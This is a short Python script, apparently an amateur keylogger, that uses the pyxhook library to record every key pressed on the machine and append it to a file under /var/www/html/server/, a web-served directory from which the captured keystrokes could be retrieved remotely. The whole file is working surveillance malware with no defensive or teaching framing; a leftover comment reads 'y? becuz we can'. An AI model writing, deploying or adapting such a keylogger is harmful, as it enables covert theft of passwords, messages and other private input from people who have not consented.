#import sys
import os
import pyxhook
#k = 0
#try:
#    buff = ''
#    while True:
#        buff += sys.stdin.read(1)
#        if buff.endswith('\n'):
#            print (buff[:-1])
#            buff = ''
#            k = k + 1
#except KeyboardInterrupt:
#   sys.stdout.flush()
#   pass
log_file = os.environ.get( 
    'pylogger_file', 
    os.path.expanduser('/var/www/html/server/test')) 
cancel_key = ord( 
    os.environ.get( 
        'pylogger_cancel', 
        '`'
)[0] 
) 
def OnKeyPress(event): 
    with open(log_file, 'a') as f: 
        f.write('{}'.format(event.Key))
        
new_hook = pyxhook.HookManager() 
new_hook.KeyDown = OnKeyPress 
new_hook.HookKeyboard() 
try: 
    new_hook.start()         # start the hook 
except KeyboardInterrupt: 
    # User cancelled from command line. 
    pass

f1 = open("/var/www/html/server/test","a")
#f1.write("hi \n")
#f1.write("y? \n becuz we can \n")
#f.write(buff)
f1.close()
